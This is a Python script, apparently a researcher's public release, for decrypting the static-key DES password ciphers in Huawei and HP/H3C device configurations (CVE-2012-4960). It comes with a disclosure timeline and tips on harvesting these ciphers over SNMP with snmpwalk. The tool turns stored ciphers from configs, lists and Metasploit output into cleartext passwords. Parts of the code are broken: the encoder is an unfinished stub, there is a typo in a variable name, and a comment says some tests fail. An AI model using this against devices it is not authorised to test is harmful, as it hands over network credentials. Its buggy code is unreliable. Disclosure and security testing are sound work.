#!/usr/bin/env python
# encoding: utf-8

__version__ = '1.0'

"""
hh3c_cipher.py - You don't make an omlette without cracking a few eggs!

Here's the story...
===================

So here I am, sitting in a crowded office in Asia with a bunch of guys
casually speaking about their network. It's a combination of Cisco,
Huawei, HP, Juniper and whatever else they can get their hands on.

We talk about vulnerabilities and the topic of the Cisco Type 7 password
comes up. It's still part of Cisco IOS. Look at Huawei (ne H3C ne 3Com)
and their cipher!

I mean just look at it! It's long and scary looking!

I'm not phased by this part of the argument. It looks too much like a Base64
string. I obtain some sample cipher results and try my hand at analysis.
Shift bits, string templates... Nope. Doesn't seem to be Base64.

Frustrated I searched the Internet to see if anyone has figured this out but,
alas, it didn't look like it. I shared my collected info with some friends
and went to do other things.

One thing I like to do when I encounter new (to me) devices with SNMP is run
"snmpwalk -c <r/w string> -v 1 $ip .1 > device-mibwalk.txt" -- as that runs
I search for the vendor's MIB collection to see if there's anything cool you
can do. Usually it doesn't bear fruit but...

Hark! What are these little nuggets before me?

   SNMPv2-SMI::enterprises.2011.10.2.12.1.1.1.1.1 = "admin"
   SNMPv2-SMI::enterprises.2011.10.2.12.1.1.1.2.1 = "<the cipher string again>"

enterprises.2011.2.12.1.1.1 is the H3CUser MIB which, for some reason, will
return the username, password or cipher, access level, and some other bits
of info. So for you penetration testers out there, if you find the SNMP R/O
string then you also get the local accounts/passwords!

Sure you can try to use the H3CCopyConfiguration routines but that may leave
a digital trail.. This... this just gives you the keys because you asked
asked nicely and knew the secret handshake.

Reinvigorated by this finding I picked up the collection of cipher hashes
again.

What follows is the result of this research.

Timeline
--------

   June 21, 2012      - see cipher string in snmpwalk, begin curiosity!
   July 2012          - work on deciphering the ciphertext
   July 20ish, 2012   - success!
   August 6, 2012     - contact US-CERT (VU#225404) with intent to disclose
   September 5, 2012  - Ask US-CERT for update from HP/H3C
   September 6, 2012  - HP/H3C asks for more time before 45-day disclosure
   September 6, 2012  - Grant extension till October 20 (Toorcon 14)
   October 20, 2012   - Disclos..err..delay per HP request
   November 13, 2012  - eMaze researchers disclose the cipher
   November 14, 2012  - publish.....!

References:

   US-CERT VU#948096
   CVE-2012-4960
   http://blog.emaze.net/2012/11/weak-password-encryption-on-huawei.html

"""

import sys, os
from Crypto.Cipher import DES
from optparse import OptionParser

class HH3CError(Exception):#ValueError, AssertionError):
    pass

class HH3CCipher():
    """
    HH3CCipher class

    Huawei and HP/H3C HP devices have a consistent method for protecting
    passwords stored in their configuration. When entering passwords on
    the CLI or in text files, the "password cipher" command will accept
    either the cleartext or a cipher.

    To recognize the difference the device looks at the length of the string.
    If it's 24 or 88 characters it will then check to see if it's an ASCII
    representation of the cipher.
    """
    #---------------------------------------------------------------------
    def __init__(self, key='\x01\x02\x03\x04\x05\x06\x07\x08'):
        """
        Sets up DES box

        Args:
          @key = DES secret key. Default: '\x01\x02\x03\x04\x05\x06\x07\x08'
        """
        self.desbox = DES.new(key, DES.MODE_ECB)

    #---------------------------------------------------------------------
    def bintoascii(self, cipher=None, cipher_len=24):
        """
        HH3C Binary to ASCII converter
        XXX: Not complete
        TOOD: Comments! Logic flow! Notes!

        Args:
          @cipher = Encrypted cipher string to convert to ASCII
          @cipher_len = Output length: 24 or 88

        Returns:
          @result = ASCII representation of ciphertext string
        """

        if not isinstance(cipher, str):
            raise HH3CError, 'No cipher string value sent'
            return ""

        a0 = binval       # binary value
        a3 = cipher_len   # length of cipher output
        if a3 == 88:      # set the rotation value
            a1 = 64
        else:
            a1 = 16

        # null out the result register
        result = []
        [result.append('\x00') for c in range(0, a3)]

        a3 = cipher
        t1 = 0
        t0 = 63

        return result

    #---------------------------------------------------------------------
    def asciitobin(self, cipher=None):
        """
        HH3C ASCII to Binary converter

        Args:
          @cipher = ASCII Ciphertext to convert to binary

        Returns:
          @result = Binary string to send to decrypt function
        """

        if not isinstance(cipher, str):
            raise HH3CError, 'No string sent'

        cipherlen = len(cipher)
        """
        if cipherlen == 24:
            endstep = 16
        elif cipherlen == 88:
            endstep = 64
        else:
        """
        if cipherlen != 24 and cipherlen != 88:
            raise HH3CError, '%s invalid: must be 24 or 88 characters in length but yours is %s.' % (cipher, cipherlen)

        # result is an array of bytes
        result = bytearray()

        # check value starts as ordinal of 'a' (97)
        chkval = ord('a')

        # loop in groups of 4 characters at once.
        for cnt in range(0, cipherlen, 4):
            # -------> character #1
            # get ordinal of first character in group
            cv1 = ord(cipher[cnt])

            if cv1 == chkval:
                # ordinals are the same, set checkval 63
                cv1 = ord('?')

            # move cv1 to cv2 and subtract 33
            cv2 = cv1-33

            # -------> character #2
            # get the ordinal of the next character
            cv1 = ord(cipher[cnt+1])

            if cv1 != chkval:
                # ordinals are not the same, shift cv2 left 6 bytes
                cv2 = cv2 << 6
            else:
                # ordinals are the same, set checkval to 63
                cv1 = ord('?')

            # move cv1 to cv2 and subtract 33
            cv1 = cv1-33
            # or cv2 and cv1 together, result into cv2
            cv2 = cv2 | cv1

            # --------> character #3
            # get the ordinal of the 3rd character
            cv1 = ord(cipher[cnt+2])

            if cv1 != chkval:
                # ordinals are not the same, shift cv2 left 6 bytes
                cv2 = cv2 << 6
            else:
                # ordinals are the same, set checkval to 63
                cv1 = ord('?')

            # move cv1 to cv2 and subtract 33
            cv1 = cv1-33
            # or cv2 and cv1 together, result into cv2
            cv2 = cv2 | cv1

            # --------> character #4
            # get the ordinal of the 4th character
            cv1 = ord(cipher[cnt+3])
            if cv1 != chkval:
                # ordinals are not the same, shift cv2 left 6 bytes
                cv2 = cv2 << 6
            else:
                # ordinals are the same, set checkval to 63
                cv1 = ord('?')

            # output
            cv1 = cv1-33
            cv2 = cv2 | cv1

            # take ordinal result and cut byte values into result
            result.append((cv2 & 0xff0000) >> 16)
            result.append((cv2 & 0xff00) >> 8)
            result.append(cv2 & 0xff)

            #print str(result).encode("hex")

        return result

    #---------------------------------------------------------------------
    def filltext(self, ct=""):
        """
        Pad a cleartext value with nulls

        If len(ct) <= 24, fill with null until len == 24 else fill with
        null until len == 88

        Args:
          @ct = Cleartext string

        Returns:
          @result = Null padded string output
        """
        outp = []
        if len(ct) <= 24:
            [outp.append('\x00') for z in range(0,24)]
        else:
            [outp.append('\x00') for z in range(0,88)]
        for z in range(0, len(ct)-1):
            outp[z] = ct[z]
        return "".join(outp)

    #---------------------------------------------------------------------
    def fillbin(self, b=bytearray()):
        """
        Pad a bytearray value to 8 byte boundary for DES

        Args:
          @b = Python bytearray of hex characters

        Returns:
          @b = Null padded Python bytearray
        """
        if not isinstance(b, bytearray):
            return b

        b = str(b)
        while (len(b) % 8):
            b += '\x00' * (len(b) % 8)
        return b

    #---------------------------------------------------------------------
    def decipher(self, cipher=None):
        """
        Takes an ASCII cipher, turns it into binary string then decrypts
        it with a static keyed DES in ECB mode. DES requires sources to be
        multiples of 8 bytes so pad it if necessary.

        Args:
          @cipher = 24 or 88 length ASCII ciphertext

        Returns:
          @string
        """
        try:
            binval = self.asciitobin(cipher)
            binval = self.fillbin(binval)
            a = [ord(x) for x in binval]
            #print a
            ct = self.desbox.decrypt(str(binval))
        except HH3CError, e:
            raise HH3CError, e

        # return up to the first null byte
        # XXX: some tests are failing!
        a = [ord(x) for x in ct]
        #print a
        return ct[:ct.find('\x00')]

    #---------------------------------------------------------------------
    def encipher(self, ct=None):
        """
        Takes a cleartext value, encrypts it with static keyed DES in ECB
        mode. DES requires sources to be multiples of 8 bytes to pad if
        necessary. Convert binary result to ASCII.

        Args:
          @cleartext = Cleartext string to encrypt

        Returns:
          @string - The ASCII string representation
        """
        ct = self.filltext(ct)
        binval = self.desbox.encrypt(ct)

        return self.bintoascii(binval)

##########################################################################
def main(argv=None):
    Progname = os.path.basename(sys.argv[0])

    optparser = OptionParser(version="%s: %s" % (Progname, __version__))
    optparser.add_option("-d", "--debug", dest="debug",
                         action="store_true", help="log debugging messages")
    optparser.add_option("-c", "--cipher", dest="cipher", action="store",
                         help="ASCII ciphertext to decrypt")
    optparser.add_option("-f", "--file", dest="file", action="store",
                         help="Configuration filename")
    optparser.add_option("-l", "--list", dest="list", action="store",
                         help="Filename with ciphertexts, one per line")
    optparser.add_option("-m", "--csv", dest="csv", action="store",
                         help="Parse Metasploit CSV output")
    optparser.add_option("-t", "--tests", dest="tests", action="store_true",
                         help="Run test list of ciphertexts")

    (options, params) = optparser.parse_args()

    hh3c = HH3CCipher()
    if options.tests:
        # run through a list of known cleartext/cipher combos and compare
        test_ciphers = [
            ['bad', 'bad'],
            ['123', '7-CZB#/YX]KQ=^Q`MAF4<1!!'],
            ['123', '!TP<\*EMUHL,408`W7TH!Q!!'],
            ['1234567', '_(TT8F]Y\\5SQ=^Q`MAF4<1!!'],
            ['huawei', 'N`C55QK<`=/Q=^Q`MAF4<1!!'],
            ['a', 'D(HD%5.*MN;Q=^Q`MAF4<1!!'],
            ['aa', 'P+J^5@ZGG[3Q=^Q`MAF4<1!!'],
            ['aaa', '+Q4Z3D_*-N[Q=^Q`MAF4<1!!'],
            ['aaaa', 'EHHC8L%9.F3Q=^Q`MAF4<1!!'],
            ['aaaaa', 'X`9:NJ_A#$WQ=^Q`MAF4<1!!'],
            ['aaaaaa', 'B.7)"^_<OGCQ=^Q`MAF4<1!!'],
            ['aaaaaaaa', '2P;JH_C3\'+_Q=^Q`MAF4<1!!'],
            ['aaaaaaaaaaa', '2P;JH_C3\'+]L"0F+0YESXA!!'],
            ['aaaaaaaaaaaa', '2P;JH_C3\'+_3aa*aM2AW6!!!'],
            ['aaaaaaaaaaaaa', '2P;JH_C3\'+`@^BGWH[!)01!!'],
            ['aaaaaaaaaaaaaaa', '2P;JH_C3\'+^\'^KG@[*)9LQ!!'],
            ['aaaaaaaaaaaaaaaaaaaa', '2P;JH_C3\'+^\'^KG@[*)9LZ*ZYF[R\'$:5M(0=0\\)*5WWQ=^Q`MAF4<<"TX$_S#6.NM(0=0\\)*5WWQ=^Q`MAF4<1!!'],
            ['aaaaaaaaaaaaaaaaaaaaaa', '2P;JH_C3\'+^\'^KG@[*)9LY46C!@@G\JIM(0=0\\)*5WWQ=^Q`MAF4<<"TX$_S#6.NM(0=0\\)*5WWQ=^Q`MAF4<1!!'],
            ['aaaaaaaaaaaaaaaaaaaaaaaa', '2P;JH_C3\'+^\'^KG@[*)9LU<WK:`IEBCPM(0=0\\)*5WWQ=^Q`MAF4<<"TX$_S#6.NM(0=0\\)*5WWQ=^Q`MAF4<1!!'],
            ['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', '2P;JH_C3\'+^\'^KG@[*)9LU<WK:`IEBCP2P;JH_C3\'+_Q=^Q`MAF4<<"TX$_S#6.NM(0=0\\)*5WWQ=^Q`MAF4<1!!'],
            ['aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', '2P;JH_C3\'+^\'^KG@[*)9LU<WK:`IEBCP2P;JH_C3\'+^\'^KG@[*)9LU<WK:`IEBCPM(0=0\\)*5WWQ=^Q`MAF4<1!!'],
            ['B', 'YL=J>$++[O3Q=^Q`MAF4<1!!'],
            ['BB', '.=)#<4^HEV\'Q=^Q`MAF4<1!!'],
            ['BBB', '=;X/#N\\KW5_Q=^Q`MAF4<1!!'],
            ['BBBB', 'R([:]]B:1Z\'Q=^Q`MAF4<1!!'],
            ['BBBBB', '_SY$PANNSX\'Q=^Q`MAF4<1!!'],
            ['BBBBBB', 'C"#BJT+2Y_;Q=^Q`MAF4<1!!'],
            ['BBBBBBBB', '*$&$;@K&L+GQ=^Q`MAF4<1!!'],
            ['BBBBBBBBBBB', '*$&$;@K&L+FRL=Y+XOL:4Q!!'],
            ['BBBBBBBBBBBB', '*$&$;@K&L+H%@JHTS&F$E1!!'],
            ['BBBBBBBBBBBBB', '*$&$;@K&L+H\\,A/_#WX,=1!!'],
            ['BBBBBBBBBBBBBB', '*$&$;@K&L+EE-5.J_I7MK9A1I;=SEa0GM(0=0\\)*5WWQ=^Q`MAF4<<"TX$_S#6.NM(0=0\\)*5WWQ=^Q`MAF4<1!!'],
            ['BBBBBBBBBBBBBBBB', '*$&$;@K&L+EE-5.J_I7MK1!!'],
            ['BBBBBBBBBBBBBBBBBBBB', '*$&$;@K&L+EE-5.J_I7MK=2_G@0)75/2M(0=0\\)*5WWQ=^Q`MAF4<<"TX$_S#6.NM(0=0\\)*5WWQ=^Q`MAF4<1!!'],
            ['BBBBBBBBBBBBBBBBBBBBBBBB', '*$&$;@K&L+EE-5.J_I7MK31R1WH[B;SJM(0=0\\)*5WWQ=^Q`MAF4<<"TX$_S#6.NM(0=0\\)*5WWQ=^Q`MAF4<1!!'],
            ['BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB', '*$&$;@K&L+EE-5.J_I7MK31R1WH[B;SJ*$&$;@K&L+GQ=^Q`MAF4<<"TX$_S#6.NM(0=0\\)*5WWQ=^Q`MAF4<1!!'],
            ['BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB', '*$&$;@K&L+EE-5.J_I7MK31R1WH[B;SJ*$&$;@K&L+EE-5.J_I7MK31R1WH[B;SJM(0=0\\)*5WWQ=^Q`MAF4<1!!'],
        ]

        print "--------------------------------------+"
        print "+---( HH3C Cipher Tests )-------------+"
        print "--------------------------------------+"
        tested = 0
        passed = 0
        failed = 0
        for test_cipher in test_ciphers:
            tested += 1
            (cleartext, cipher) = test_cipher
            try:
                result = hh3c.decipher(cipher)
                if result == cleartext:
                    #print "Passed: expected %s, received %s" % (cleartext, result)
                    passed += 1
                else:
                    print "%s FAILED: expected %s (len: %s), received %s (len: %s)" % (cipher, cleartext.encode("hex"), len(cleartext), result.encode("hex"), len(result))
                    failed += 1
            except Exception, e:
                print "Exception: %s" % (e)
                failed += 1

        print "\n(%s) Tests performed, (%s) PASSED, (%s) FAILED\n" % (tested, passed, failed)

    elif options.cipher:
        print "--------------------------------------+"
        print "+---( Single Cipher Decryption )------+"
        print "--------------------------------------+"
        try:
            print hh3c.decipher(options.cipher)
        except Exception, e:
            print e

    elif options.file:
        # input / ouput convert looking for cipher strings
        import fileinput
        import re
        cipher_re = re.compile('password cipher ([\x20-\x7e]{24,88})')
        for line in fileinput.input(files=options.file):
            match = cipher_re.search(line)
            if match:
                cipher = match.group(1)
                try:
                    cleartext = hh3c.decipher(cipher)
                    line = line.replace(cipher, clearetext)
                except:
                    pass
            print line

    elif options.list:
        import fileinput
        for line in fileinput.input(files=options.list):
            line = line.strip('\r\n')
            try:
                print "%s: %s" % (line, hh3c.decipher(line))
            except Exception, e:
                print e

    elif options.csv:
        import csv
        cvsr = csv.reader(open(options.csv, "rb"))
        for row in cvsr:
            ip = row[0]
            account = row[1]
            password = row[2]
            level = row[3]
            if level == "7":
                try:
                    password = hh3c.decipher(password)
                except Exception, e:
                    password = e
            print "%s: %s - %s" % (ip, account, password)

if __name__ == "__main__":
    sys.exit(main())
